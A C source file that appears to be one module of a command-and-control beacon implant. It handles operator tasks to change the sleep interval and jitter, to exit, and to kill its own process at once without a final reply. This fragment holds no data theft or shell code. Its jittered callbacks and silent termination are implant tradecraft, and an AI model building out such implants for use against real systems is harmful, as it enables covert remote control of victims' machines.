// System-level commands: sleep, exit.
// Getuid is reported in checkin metadata; re-query here for on-demand use.

#include "../core/beacon.h"

void cmd_sleep(const BeaconTask* t) {
    // Payload: 4-byte big-endian u32 (ms) + 1-byte jitter_pct (client packs it this way).
    if (!t->pay || t->pay_len < 4) return;

    const uint8_t* p = t->pay;
    uint32_t ms   = ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
                    ((uint32_t)p[2] <<  8) |  (uint32_t)p[3];
    uint8_t  jpct = t->pay_len >= 5 ? p[4] : 0;

    if (jpct > 99) jpct = 99;

    BeaconState* st = beacon_state();
    st->sleep_ms   = ms;
    st->jitter_pct = jpct;

    const char ok[] = "sleep updated\n";
    out_write(ok, sizeof(ok)-1);
}

void cmd_exit(const BeaconTask* t) {
    (void)t;
    const char bye[] = "exiting\n";
    out_write(bye, sizeof(bye)-1);
    beacon_state()->quit = 1;
}

void cmd_kill(const BeaconTask* t) {
    (void)t;
    // Немедленно завершить текущий процесс без ожидания следующей итерации цикла.
    // Финальный ответ не отправляется — процесс исчезает мгновенно.
    TerminateProcess(GetCurrentProcess(), 0);
}
